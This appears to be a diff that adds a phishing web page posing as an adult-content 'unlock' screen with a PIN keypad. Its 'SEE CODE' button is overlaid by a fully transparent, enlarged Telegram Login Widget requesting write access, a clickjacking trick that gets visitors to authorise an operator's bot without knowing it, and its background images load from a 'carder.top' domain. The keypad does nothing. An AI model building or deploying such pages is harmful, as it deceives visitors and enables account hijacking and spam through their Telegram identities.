@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Verify</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        
+        body { 
+            height: 100vh; 
+            background-color: #1a1a1a;
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            position: relative;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+        }
+
+        /* Floating Phone Icon */
+        .phone-icon-wrapper {
+            position: relative;
+            margin-bottom: -15px; /* Overlaps with the message box */
+            z-index: 3;
+            filter: drop-shadow(0 10px 10px rgba(0,0,0,0.3));
+        }
+        .phone-emoji {
+            font-size: 80px;
+            line-height: 1;
+        }
+        .mail-badge {
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 35px;
+        }
+
+        /* White Message Box */
+        .message-box {
+            background: #ffffff;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 16px;
+            color: #333;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        .message-box span { vertical-align: middle; font-size: 18px; margin-left: 5px; }
+
+        /* 5 Empty PIN Boxes */
+        .pin-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            width: 100%;
+            justify-content: space-between;
+        }
+        .pin-box {
+            width: 55px;
+            height: 65px;
+            border: 2px solid rgba(255, 255, 255, 0.6);
+            border-radius: 10px;
+            background: transparent;
+        }
+
+        /* See Code Button Wrapper */
+        .btn-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        /* Visible Blue Button */
+        .see-code-btn {
+            width: 100%;
+            background-color: #5bb3f0;
+            color: white;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        /* Hidden Telegram Login Widget (Catches the click) */
+        .telegram-widget {
+            position: absolute;
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            opacity: 0; /* Fully invisible */
+            overflow: hidden;
+            z-index: 5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        /* Make the telegram button giant so it covers the whole area */
+        .telegram-widget iframe { 
+            transform: scale(3); 
+            cursor: pointer; 
+        }
+
+        /* Number Keypad */
+        .keypad {
+            width: 100%;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        .key {
+            background-color: #5bb3f0;
+            color: white;
+            padding: 15px 0;
+            font-size: 20px;
+            font-weight: 600;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            cursor: default;
+        }
+        .key-empty { background: transparent; box-shadow: none; pointer-events: none; }
+        
+        /* Backspace Icon */
+        .key svg { vertical-align: middle; fill: white; width: 24px; height: 24px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- Floating Phone & Mail Icon -->
+        <div class="phone-icon-wrapper">
+            <div class="phone-emoji">📱</div>
+            <div class="mail-badge">✉️</div>
+        </div>
+        
+        <!-- White Message Box -->
+        <div class="message-box">
+            Enter code to unlock <span>🔞</span>
+        </div>
+
+        <!-- 5 PIN Boxes -->
+        <div class="pin-group">
+            <div class="pin-box"></div>
+            <div class="pin-box"></div>
+            <div class="pin-box"></div>
+            <div class="pin-box"></div>
+            <div class="pin-box"></div>
+        </div>
+
+        <!-- Button with Hidden Telegram Login -->
+        <div class="btn-wrapper">
+            <div class="see-code-btn">SEE CODE 👀</div>
+            
+            <div class="telegram-widget">
+                <!-- আপনার বটের ইউজারনেম এখানে বসান -->
+                <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="YOUR_BOT_USERNAME" data-size="large" data-request-access="write"></script>
+            </div>
+        </div>
+
+        <!-- Keypad Grid -->
+        <div class="keypad">
+            <div class="key">1</div>
+            <div class="key">2</div>
+            <div class="key">3</div>
+            <div class="key">4</div>
+            <div class="key">5</div>
+            <div class="key">6</div>
+            <div class="key">7</div>
+            <div class="key">8</div>
+            <div class="key">9</div>
+            <div class="key-empty"></div>
+            <div class="key">0</div>
+            <div class="key">
+                <svg viewBox="0 0 24 24"><path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2zm-2.58 11.59l-1.42 1.41L14 14.17l-2.99 2.83-1.42-1.41L12.58 12 9.59 9.01l1.42-1.41L14 10.43l2.99-2.83 1.42 1.41L15.42 12l2.99 2.99z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- Random Background Script -->
+    <script>
+        const images = [
+            "https://carder.top/imagens/1791918460640-323067073.jpg",
+            "https://carder.top/imagens/1791918463157-201532531.jpg",
+            "https://carder.top/imagens/1791918465627-141146469.jpg",
+            "https://carder.top/imagens/1791918468080-915885205.jpg",
+            "https://carder.top/imagens/1791918470834-230739368.jpg",
+            "https://carder.top/imagens/1791918473218-302493896.jpg",
+            "https://carder.top/imagens/1791918475663-809286845.jpg",
+            "https://carder.top/imagens/1791918478281-404548096.jpg",
+            "https://carder.top/imagens/1791918480747-133319708.jpg",
+            "https://carder.top/imagens/1791918483195-264299852.jpg",
+            "https://carder.top/imagens/1791918485945-762217747.jpg",
+            "https://carder.top/imagens/1791918487936-713933505.jpg",
+            "https://carder.top/imagens/1791918489799-518304521.jpg"
+        ];
+        document.body.style.backgroundImage = "url('" + images[Math.floor(Math.random() * images.length)] + "')";
+    </script>
+</body>
+</html>
